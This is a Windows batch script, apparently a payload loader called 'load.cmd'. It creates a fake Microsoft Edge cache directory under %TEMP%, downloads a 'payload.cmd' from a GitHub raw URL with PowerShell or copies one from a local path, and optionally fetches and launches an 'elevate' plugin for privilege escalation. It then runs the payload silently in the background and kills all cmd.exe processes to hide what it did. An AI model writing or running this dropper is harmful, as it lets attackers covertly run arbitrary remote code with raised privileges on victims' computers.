@echo off 

cd %TEMP% > nul
md .edge > nul
cd .edge > nul
md "Microsoft Edge" > nul
cd "Microsoft Edge" > nul
md cache > nul
md userdata > nul
md Default > nul
cd cache > nul
md Downloads > nul
md Bookmarks > nul
md Application > nul
cd Application > nul

if "%1"=="url" goto online
if "%1"=="path" goto local
goto fail

:online
powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/realgamebreaker/cmdloader/main/payload.cmd -OutFile payload.cmd"
goto elevate

:local
xcopy "C:\Path\to\your\Payload.cmd" "%TEMP%\.edge\Microsoft Edge\cache\Application\payload.cmd" /y
goto elevate


:elevate
if %2==elevate powershell -Command "Invoke-WebRequest https://raw.githubusercontent.com/realgamebreaker/cmd-plugins/main/elevate.cmd-plugin -OutFile elevate.plugin.cmd" 
if %2==elevate start elevate.plugin.cmd
if %2==elevate exit
goto silentrun

:silentrun
start /B cmd /C "payload.cmd"
goto exit


:fail
echo.
echo Correct Usage: load.cmd [url/path] (elevate)
pause

:exit
taskkill /f /im cmd.exe
